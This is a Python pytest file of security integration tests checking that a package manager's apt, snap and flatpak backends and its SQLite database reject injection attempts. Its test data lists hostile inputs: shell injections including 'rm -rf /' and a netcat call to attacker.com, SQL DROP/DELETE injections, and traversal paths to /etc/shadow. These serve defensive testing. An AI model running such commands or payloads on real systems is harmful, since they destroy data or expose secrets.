"""
Security-focused integration tests
Tests interactions between components and end-to-end security
"""

import pytest
import tempfile
import os
from unittest.mock import Mock, patch
from database import DatabaseManager
from apt_backend import AptBackend
from snap_backend import SnapBackend
from flatpak_backend import FlatpakBackend


class TestP0IntegrationSecurity:
    """Integration tests for P0 security fixes across components"""

    @pytest.mark.security
    @pytest.mark.integration
    def test_full_stack_command_injection_protection(self):
        """Test command injection protection across full stack"""
        # Create temporary database
        fd, db_path = tempfile.mkstemp(suffix='.db')
        os.close(fd)

        try:
            db = DatabaseManager(db_path)
            apt = AptBackend()
            snap = SnapBackend()
            flatpak = FlatpakBackend()

            # Attempt to inject commands through different vectors
            malicious_inputs = [
                "test; rm -rf /",
                "test && whoami",
                "test | nc attacker.com",
                "$(id)",
                "`whoami`",
                "test\nrm -rf /",
                "../../../etc/passwd"
            ]

            for malicious in malicious_inputs:
                # All backends should reject malicious package names
                with patch('apt_backend.subprocess.run') as mock_run:
                    success, msg = apt.install_package(malicious)
                    assert success == False
                    assert "Invalid" in msg
                    mock_run.assert_not_called()

                with patch('snap_backend.subprocess.run') as mock_run:
                    success, msg = snap.install_package(malicious)
                    assert success == False
                    mock_run.assert_not_called()

                with patch('flatpak_backend.subprocess.run') as mock_run:
                    success, msg = flatpak.install_package(malicious)
                    assert success == False
                    mock_run.assert_not_called()

            db.close()
        finally:
            try:
                os.unlink(db_path)
            except:
                pass

    @pytest.mark.security
    @pytest.mark.integration
    def test_database_sql_injection_all_methods(self):
        """Test SQL injection protection across all database methods"""
        fd, db_path = tempfile.mkstemp(suffix='.db')
        os.close(fd)

        try:
            db = DatabaseManager(db_path)

            # Test preference updates with SQL injection attempts
            sql_injection_attempts = [
                "repo_apt_enabled = 1; DROP TABLE user_prefs;--",
                "repo_apt_enabled; DELETE FROM logs;--",
                "'; UPDATE user_prefs SET repo_apt_enabled = 0;--"
            ]

            for injection in sql_injection_attempts:
                with pytest.raises(ValueError):
                    db.update_preference(injection, 1)

            # Verify tables still exist
            tables = ['installed_apps', 'user_prefs', 'logs', 'custom_repositories']
            for table in tables:
                db.cursor.execute(f"SELECT name FROM sqlite_master WHERE type='table' AND name=?", (table,))
                assert db.cursor.fetchone() is not None

            db.close()
        finally:
            try:
                os.unlink(db_path)
            except:
                pass

    @pytest.mark.security
    @pytest.mark.integration
    def test_path_traversal_protection_integration(self):
        """Test path traversal protection in export operations"""
        fd, db_path = tempfile.mkstemp(suffix='.db')
        os.close(fd)

        try:
            db = DatabaseManager(db_path)

            # Add some test data
            db.add_log("install", "test-package", "apt", "success", "Test log")

            # Test various path traversal attempts
            traversal_attempts = [
                "../../../../etc/passwd",
                "/etc/shadow",
                "../../../tmp/evil.txt",
                "/sys/kernel/debug/test",
                "/proc/1/mem"
            ]

            for path in traversal_attempts:
                with pytest.raises(ValueError, match="Invalid file path"):
                    db.export_logs(path)

            db.close()
        finally:
            try:
                os.unlink(db_path)
            except:
                pass

    @pytest.mark.security
    @pytest.mark.integration
    def test_concurrent_database_access_safety(self):
        """Test that concurrent database access is safe"""
        import threading

        fd, db_path = tempfile.mkstemp(suffix='.db')
        os.close(fd)

        errors = []
        results = []

        def worker(worker_id):
            try:
                db = DatabaseManager(db_path)

                # Perform operations
                for i in range(10):
                    db.add_installed_app(
                        f"App {worker_id}-{i}",
                        f"app-{worker_id}-{i}",
                        "apt",
                        "repo",
                        "1.0",
                        "desc"
                    )

                    # Update preferences
                    db.update_preference('log_retention_days', 30 + worker_id)

                    # Add logs
                    db.add_log("test", f"pkg-{worker_id}-{i}", "apt", "success", "Test")

                results.append(worker_id)
                db.close()
            except Exception as e:
                errors.append((worker_id, str(e)))

        # Run 5 concurrent threads
        threads = []
        for i in range(5):
            t = threading.Thread(target=worker, args=(i,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        # All threads should complete successfully
        assert len(errors) == 0, f"Errors: {errors}"
        assert len(results) == 5

        # Verify data integrity
        db = DatabaseManager(db_path)
        apps = db.get_installed_apps()
        assert len(apps) == 50  # 5 workers * 10 apps each

        db.close()

        try:
            os.unlink(db_path)
        except:
            pass


class TestDataIntegrity:
    """Tests for data integrity across operations"""

    @pytest.mark.integration
    def test_soft_delete_workflow(self):
        """Test complete soft delete workflow"""
        fd, db_path = tempfile.mkstemp(suffix='.db')
        os.close(fd)

        try:
            db = DatabaseManager(db_path)

            # Install app
            db.add_installed_app("Test App", "test-app", "apt", "repo", "1.0", "desc")
            assert db.is_app_installed("test-app")

            # Soft delete
            db.remove_installed_app("test-app")
            assert not db.is_app_installed("test-app")

            # Data should still exist in database
            db.cursor.execute("SELECT deleted_at FROM installed_apps WHERE package_name = ?", ("test-app",))
            row = db.cursor.fetchone()
            assert row is not None
            assert row[0] is not None

            # Can re-install (new entry)
            db.add_installed_app("Test App", "test-app-v2", "apt", "repo", "2.0", "desc")
            assert db.is_app_installed("test-app-v2")

            db.close()
        finally:
            try:
                os.unlink(db_path)
            except:
                pass

    @pytest.mark.integration
    def test_preference_persistence(self):
        """Test preference changes persist correctly"""
        fd, db_path = tempfile.mkstemp(suffix='.db')
        os.close(fd)

        try:
            # First connection
            db1 = DatabaseManager(db_path)
            db1.update_preference('log_retention_days', 90)
            db1.close()

            # Second connection should see the change
            db2 = DatabaseManager(db_path)
            prefs = db2.get_preferences()
            assert prefs['log_retention_days'] == 90
            db2.close()

        finally:
            try:
                os.unlink(db_path)
            except:
                pass


class TestInputSanitization:
    """Tests for input sanitization and validation"""

    @pytest.mark.security
    @pytest.mark.integration
    def test_all_backends_reject_malformed_input(self):
        """Test all backends properly reject malformed input"""
        apt = AptBackend()
        snap = SnapBackend()
        flatpak = FlatpakBackend()

        # Test various malformed inputs
        invalid_inputs = [
            "",  # Empty
            " " * 100,  # Whitespace
            "a" * 300,  # Too long
            "\x00\x01\x02",  # Null bytes/control characters
            "../../etc",  # Path traversal
            "${USER}",  # Variable expansion
            "test'OR'1'='1",  # SQL-like injection
        ]

        for invalid in invalid_inputs:
            with patch('apt_backend.subprocess.run') as mock_apt:
                success, _ = apt.install_package(invalid)
                if not invalid.strip():
                    # Empty strings might be handled differently
                    continue
                # Should either reject or not call subprocess for clearly invalid names
                if not success:
                    mock_apt.assert_not_called()

    @pytest.mark.security
    def test_unicode_and_special_chars_handling(self):
        """Test handling of Unicode and special characters"""
        fd, db_path = tempfile.mkstemp(suffix='.db')
        os.close(fd)

        try:
            db = DatabaseManager(db_path)

            # Unicode should be handled correctly
            db.add_installed_app(
                "Tëst Äpp 你好",
                "test-unicode",
                "apt",
                "Rëpö",
                "1.0",
                "Dësc 🎉"
            )

            apps = db.get_installed_apps()
            assert len(apps) == 1
            assert "你好" in apps[0]['name']

            db.close()
        finally:
            try:
                os.unlink(db_path)
            except:
                pass


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
